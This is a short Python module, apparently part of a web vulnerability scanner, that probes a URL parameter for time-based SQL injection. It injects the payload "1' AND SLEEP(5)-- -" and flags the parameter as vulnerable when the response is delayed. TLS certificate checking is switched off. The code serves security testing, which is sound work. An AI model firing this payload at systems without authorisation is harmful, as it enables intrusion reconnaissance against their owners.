import requests, time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

SLEEP_SEC = 5
PAYLOAD = f"1' AND SLEEP({SLEEP_SEC})-- -"

def _mutate(url: str, param: str, payload: str) -> str:
    p = urlparse(url)
    qs = parse_qs(p.query)
    qs[param] = payload
    return urlunparse(p._replace(query=urlencode(qs, doseq=True)))

def test(url: str, parameter: str, headers=None, timeout=8.0):
    target = _mutate(url, parameter, PAYLOAD)
    try:
        start = time.perf_counter()
        requests.get(target, headers=headers, timeout=timeout + SLEEP_SEC + 1, verify=False)
        duration = time.perf_counter() - start
        vulnerable = duration >= SLEEP_SEC
    except Exception:
        vulnerable = False
    return {
        "url": url,
        "technique": "Time‑based",
        "parameter": parameter,
        "payload": PAYLOAD,
        "vulnerable": vulnerable,
        "severity": "High" if vulnerable else "None",
    }
